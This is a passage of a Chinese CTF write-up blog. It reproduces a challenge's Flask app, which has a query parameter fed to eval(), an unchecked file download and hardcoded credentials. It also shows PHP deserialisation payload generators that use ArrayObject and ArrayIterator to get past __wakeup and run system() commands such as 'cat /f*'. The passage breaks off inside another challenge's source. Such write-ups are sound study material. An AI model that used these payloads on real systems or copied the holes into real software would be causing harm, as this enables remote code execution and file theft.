class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后发现在hello路由那，发现有eval命令，然后就进行传值，eval为参数</p><p>然后源码里没有os库，那么我们就自己传一个os库进去</p><p><img src="../images/image-20230404170910299.png" alt="image-20230404170910299"></p><p>成功拿到flag</p><p>遇到这种给key的题，一般都是考seesion伪造或则是python的pickel反序列化</p><h2 id="暗网聊天室"><a href="#暗网聊天室" class="headerlink" title="暗网聊天室"></a>暗网聊天室</h2><p>题目</p><p><img src="../images/image-20230404173019155.png" alt="image-20230404173019155"></p><p><strong>公钥加密       私钥解密</strong></p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>题目</p><p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">别人的总结wp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>漏洞影响版本：</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>修改属性值是这些版本才有用，这里的话是没有用的</p><p>考点：PHP7.3 __wakeup绕过，ArrayObject内置类</p><p>众所周知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了QWQ</p><p>这种情况我们可以用内置类<strong>ArrayObject</strong>，这个内置类序列化结果如下</p><p><img src="../images/image-20230404175635385.png" alt="image-20230404175635385"></p><p>这个题目很明显就是要执行system方法，然后不可以以<code>O\a</code>打头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是这里都去掉了，所以回到上面说的那个ArrayObject，他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.scuctf.com/ctfwiki/web/5.unserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化a开头的使用</a></p><p><strong>查找脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();<span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;unserialize&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        ))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181426665.png" alt="image-20230404181426665"></p><p>结果如下，注意到了还有ArrayIterator，实现了unserialize接口的大概率是C打头，因此在这几个类中寻找！</p><p>测试发现ArrayIterrator是可以的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181631721.png" alt="image-20230404181631721"></p><p><strong>过所有测试发现可以用的类为：</strong></p><ul><li>ArrayObject::unserialize</li><li>ArrayIterator::unserialize</li><li>RecursiveArrayIterator::unserialize</li><li>SplObjectStorage::unserialize</li></ul><p>其中SplObjectStorage需要注意一下：</p><p><img src="../images/image-20230404181727382.png" alt="image-20230404181727382"></p><p>给加上一条就行</p><p>参考   ———&gt;    <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">wp</a></p><h2 id="easy-class"><a href="#easy-class" class="headerlink" title="easy_class"></a>easy_class</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 09:28:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">ctfshow</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_1</span> = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_2</span> = <span class="number">0x7b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_3</span> = <span class="number">0x5b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_4</span> = <span class="number">0x60</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_5</span> = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_6</span> = <span class="number">0x5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_SIZE__</span>= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_VAL_SIZE__</span>= <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> 